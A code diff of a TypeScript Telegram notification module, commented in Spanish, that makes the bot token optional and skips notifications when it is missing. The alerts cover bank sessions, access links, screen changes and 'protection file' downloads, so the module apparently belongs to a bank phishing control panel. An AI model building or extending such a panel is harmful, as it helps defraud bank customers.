@@ -4,11 +4,11 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 if (!TELEGRAM_TOKEN || !ADMIN_CHAT_ID) {
-  throw new Error('TELEGRAM_TOKEN y ADMIN_CHAT_ID deben estar configurados en las variables de entorno');
+  console.warn('[Telegram Service] TELEGRAM_TOKEN y ADMIN_CHAT_ID no están configurados. Las notificaciones de Telegram estarán deshabilitadas.');
 }
 
-// Crear instancia del bot
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
+// Crear instancia del bot solo si hay token
+const bot = TELEGRAM_TOKEN ? new TelegramBot(TELEGRAM_TOKEN, { polling: false }) : null;
 
 export interface TelegramNotificationData {
   sessionId: string;
@@ -142,14 +142,17 @@ function formatMessage(data: TelegramNotificationData): string {
 // Función principal para enviar notificación a Telegram
 export async function sendTelegramNotification(data: TelegramNotificationData): Promise<void> {
   try {
+    if (!bot || !ADMIN_CHAT_ID) {
+      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
+      return;
+    }
+    
     const message = formatMessage(data);
     
-    if (ADMIN_CHAT_ID) {
-      await bot.sendMessage(ADMIN_CHAT_ID, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-    }
+    await bot.sendMessage(ADMIN_CHAT_ID, message, {
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    });
     
     console.log(`[Telegram] Notificación enviada exitosamente para sesión ${data.sessionId}, tipo: ${data.tipo}`);
   } catch (error) {
@@ -166,6 +169,11 @@ export async function sendSessionCreatedNotification(sessionData: {
   link: string;
 }): Promise<void> {
   try {
+    if (!bot || !ADMIN_CHAT_ID) {
+      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
+      return;
+    }
+    
     const message = `🆕 *NUEVA SESIÓN CREADA*\n\n` +
                    `🏦 *Banco:* ${sessionData.banco}\n` +
                    `🆔 *Sesión:* ${sessionData.sessionId}\n` +
@@ -174,12 +182,10 @@ export async function sendSessionCreatedNotification(sessionData: {
                    `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\n\n` +
                    `🔗 *Link de acceso:* ${sessionData.link}`;
     
-    if (ADMIN_CHAT_ID) {
-      await bot.sendMessage(ADMIN_CHAT_ID, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-    }
+    await bot.sendMessage(ADMIN_CHAT_ID, message, {
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    });
     
     console.log(`[Telegram] Notificación de nueva sesión enviada para ${sessionData.sessionId}`);
   } catch (error) {
@@ -196,6 +202,11 @@ export async function sendScreenChangeNotification(data: {
   data?: any;
 }): Promise<void> {
   try {
+    if (!bot || !ADMIN_CHAT_ID) {
+      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
+      return;
+    }
+    
     let message = `🔄 *CAMBIO DE PANTALLA*\n\n` +
                  `🏦 *Banco:* ${data.banco}\n` +
                  `🆔 *Sesión:* ${data.sessionId}\n` +
@@ -228,12 +239,10 @@ export async function sendScreenChangeNotification(data: {
       }
     }
     
-    if (ADMIN_CHAT_ID) {
-      await bot.sendMessage(ADMIN_CHAT_ID, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-    }
+    await bot.sendMessage(ADMIN_CHAT_ID, message, {
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    });
     
     console.log(`[Telegram] Notificación de cambio de pantalla enviada para ${data.sessionId}`);
   } catch (error) {
@@ -250,6 +259,11 @@ export async function sendFileDownloadNotification(data: {
   adminUser: string;
 }) {
   try {
+    if (!bot || !ADMIN_CHAT_ID) {
+      console.log('[Telegram] Servicio no configurado. Notificación omitida.');
+      return;
+    }
+    
     const message = `🔽 *DESCARGA DE ARCHIVO DE PROTECCIÓN*\n\n` +
                    `🏦 *Banco:* ${data.banco}\n` +
                    `🆔 *Sesión:* ${data.sessionId}\n` +
@@ -258,12 +272,10 @@ export async function sendFileDownloadNotification(data: {
                    `👤 *Admin:* ${data.adminUser}\n` +
                    `⏰ *Hora:* ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}`;
     
-    if (ADMIN_CHAT_ID) {
-      await bot.sendMessage(ADMIN_CHAT_ID, message, {
-        parse_mode: 'Markdown',
-        disable_web_page_preview: true
-      });
-    }
+    await bot.sendMessage(ADMIN_CHAT_ID, message, {
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    });
     
     console.log(`[Telegram] Notificación de descarga de archivo enviada para ${data.sessionId}`);
   } catch (error) {
